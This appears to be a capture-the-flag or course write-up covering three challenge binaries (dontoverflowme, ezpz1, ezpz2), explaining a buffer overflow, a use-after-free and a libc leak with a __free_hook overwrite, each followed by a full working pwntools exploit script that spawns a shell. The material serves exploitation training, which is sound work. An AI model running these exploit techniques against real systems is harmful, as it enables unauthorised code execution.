# dontoverflowme

## Overview
The target binary `dontoverflowme` provides various functions to create, view, name, and kill "clones" and includes a hidden `win` function. Our goal is to exploit the program to execute the `win` function, which eventually calls `execve("/bin/sh")`, giving us a shell.

### Target Functions

1. **`win` Function**: Located at `0x004016b9`. When executed, it displays a success message and spawns a shell with `execve("/bin/sh")`.
2. **`givehint` Function**: Prompts the user for clone actions, providing hints about usage. We can exploit this to overwrite clone data and redirect execution to `win`.
3. **`main` Function**: Displays a menu and calls the relevant function based on user input.

### Vulnerability
The vulnerability lies in the `name_clone` function. It allows us to enter a name for the clone but doesn’t adequately restrict the input length, leading to a buffer overflow. We can overwrite a function pointer or a critical variable to redirect execution.

## Exploit Strategy
Our approach leverages the overflow in `name_clone` to overwrite the function pointer that `givehint` will execute. By setting this pointer to the `win` function's address, we can hijack control flow and execute `win`.

## Attack Code

Here’s the Python exploit code using `pwntools`:

```
python
from pwn import *

context.arch = 'amd64'
win_addr = 0x004016b9  # Address of win function

if args.R:
    p = remote('6447.lol', 8001)
elif args.H:
    p = process('./dontoverflowme')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./dontoverflowme',
                  gdbscript='''
                      b *givehint
                      c
                  ''')

# Functions to interact with the binary
def create_clone(clone_id, name):
    p.sendlineafter(b'Choice: ', b'A')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())
    p.sendlineafter(b'Enter Name (max length 8): ', name)

def view_clone(clone_id):
    p.sendlineafter(b'Choice: ', b'D')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())

def kill_clone(clone_id):
    p.sendlineafter(b'Choice: ', b'B')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())

def name_clone(clone_id, name):
    p.sendlineafter(b'Choice: ', b'C')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())
    p.sendlineafter(b'Enter Name: ', name)

def give_hint(clone_id):
    p.sendlineafter(b'Choice: ', b'H')
    p.sendlineafter(b'Clone ID: ', str(clone_id).encode())

# Exploit Steps
create_clone(0, b"A" * 8)  # Create initial clone
name_clone(0, b"A" * 8 + p64(win_addr) + b'\n')  # Overflow and set function pointer to win
give_hint(0)  # Trigger exploit by invoking `givehint`

# Interact with shell
p.interactive()
```

# ezpz1

## Overview
The binary `ezpz1` allows users to create, delete, set, and ask questions. The `ask_question` function calls a function pointer stored in a question structure, which we can exploit by overwriting it with the address of the `win` function. This exploit will execute `win`, leading to shell access via `system("/bin/sh")`.

### Target Functions

1. **`win` Function** (`0x4015b9`): Executes `system("/bin/sh")`, providing a shell.
2. **`ask_question` Function**: Uses a function pointer within a question structure to call `print_question` by default. We can exploit this by overwriting the function pointer to point to `win`.
3. **`delete_question` Function**: Frees the question and its associated memory. This can be used to create a use-after-free vulnerability.

### Vulnerability
The vulnerability arises from the `delete_question` function, which frees the memory associated with a question, but does not remove its reference. By creating a new question after deletion, we can reuse the freed memory and overwrite the function pointer to point to `win`.

## Exploit Strategy

1. **Create and Delete Question**: Create an initial question (ID 0) and delete it, freeing its memory but retaining the reference.
2. **Recreate Question**: Create a new question (ID 2) that reuses the freed memory.
3. **Overwrite Function Pointer**: Use `set_question` to overwrite the function pointer with the address of `win`.
4. **Trigger Exploit**: Call `ask_question` on the first question (ID 0), which will execute `win` and give us a shell.

## Attack Code

Here’s the Python exploit code using `pwntools`:

```
python
from pwn import *

context.arch = 'amd64'

# Setup remote or local process
if args.R:
    p = remote('6447.lol', 8002)
elif args.H:
    p = process('./ezpz1')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./ezpz1',
                  gdbscript='''
                      b *ask_question
                      b *create_question
                      b *set_question
                      b *print_question
                      b *delete_question
                      c
                  ''')

# Address of win function
win_addr = 0x4015b9

# Functions to interact with the binary
def create_question():
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"C")
    p.recvuntil(b"ID ")
    return p.recvline().strip()

def set_question_payload(qid, payload):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"S")
    p.sendlineafter(b"Enter question id: ", qid)
    p.sendlineafter(b"Enter your question: ", payload)

def del_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"D")
    p.sendlineafter(b"Enter question id: ", qid)

def ask_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"A")
    p.sendlineafter(b"Enter question id: ", qid)

# Exploit Steps
qid0 = create_question()  # Step 1: Create initial question
del_question(qid0)  # Step 2: Delete it to free memory
qid2 = create_question()  # Step 3: Recreate question, reusing memory
set_question_payload(qid2, p64(win_addr))  # Step 4: Overwrite function pointer with win address
ask_question(qid0)  # Step 5: Trigger exploit by asking deleted question

# Interact with the shell
p.interactive()
```

# ezpz2

## Overview
The binary `ezpz2` provides a simple menu to create, delete, set, and ask questions, but it has vulnerabilities that allow us to exploit its function pointers to execute arbitrary code. This exploit will lead to a shell by using a GOT overwrite and leveraging `__free_hook` in `libc`.

### Target Functions and Vulnerabilities

1. **`delete_question` Function** (`0x401487`): Frees the memory associated with a question. This function is key in our exploit, as we can trigger a use-after-free vulnerability by manipulating pointers to freed chunks.
2. **GOT Overwrite**: By manipulating the GOT entry of `puts` and using the `__free_hook` in `libc`, we can redirect execution flow to `system("/bin/sh")`.
3. **`ask_question` Function** (`0x40151c`): Calls the function pointer set for each question and leak the libc address.

## Exploit Strategy

1. **Libc Leak**: Leak the libc base address using the GOT entry of `puts`.
2. **Overwrite `__free_hook`**: Calculate the addresses of `system` and `/bin/sh` in libc, and overwrite `__free_hook` to point to `system`.
3. **Trigger System Execution**: Set the argument for `system` to be the address of `/bin/sh`, then free a question to execute `system("/bin/sh")`.

## Attack Code

Here’s the Python exploit code using `pwntools`:

```
python
from pwn import *

context.arch = 'amd64'

# Setup for local or remote exploitation
if args.R:
    p = remote('6447.lol', 8003)
elif args.H:
    p = process('./ezpz2')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '80']
    p = gdb.debug('./ezpz2', gdbscript='b *delete_question\nb *set_question\nc')

elf = ELF('./ezpz2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# GOT and libc offsets
puts_got = elf.got['puts']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b'/bin/sh'))
free_hook_offset = libc.symbols['__free_hook']

# Helper functions to interact with the binary
def create_question():
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"C")
    p.recvuntil(b"ID ")
    return p.recvline().strip()

def set_question(qid, payload):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"S")
    p.sendlineafter(b"Enter question id: ", qid)
    p.sendlineafter(b"Enter your question: ", payload)

def del_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"D")
    p.sendlineafter(b"Enter question id: ", qid)

def ask_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"A")
    p.sendlineafter(b"Enter question id: ", qid)

def padding(size):
    return cyclic(size * 8, alphabet=string.ascii_uppercase, n=8).encode()

def ret_addr(p, name):
    p.recvuntil(b"I have the answer perhaps: ")
    line = p.recvline().replace(b"'", b"").replace(b"\n", b"")
    addr = u64(line.ljust(8, b"\x00"))
    print(f"{name} addr : {hex(addr)}")
    return addr

# Step 1: Leak libc base address using puts GOT entry
def leak_libc_base():
    qid0 = create_question()
    qid1 = create_question()
    del_question(qid0)
    del_question(qid1)

    set_question(qid0, padding(5) + p64(0x31) + padding(3) + p64(puts_got))
    ask_question(qid1)
    libc_addr = ret_addr(p, 'libc')

    libc_base = libc_addr - puts_offset
    return libc_base, qid0, qid1

# Step 2: Exploit using free_hook and system to get a shell
def exploit(libc_base, qid0, qid1):
    system_addr = libc_base + system_offset
    free_hook_addr = libc_base + free_hook_offset
    bin_sh_addr = libc_base + bin_sh_offset

    # Overwrite free_hook with system address
    set_question(qid0, padding(5) + p64(0x31) + padding(3) + p64(free_hook_addr))
    set_question(qid1, p64(system_addr))
    
    # Set argument for system to /bin/sh
    set_question(qid0, padding(5) + p64(0x31) + padding(3) + p64(bin_sh_addr))

    # Trigger system("/bin/sh")
    del_question(qid1)
    p.interactive()

# Execute exploit
libc_base, qid0, qid1 = leak_libc_base()
print(f"Calculated libc base address: {hex(libc_base)}")
exploit(libc_base, qid0, qid1)
```
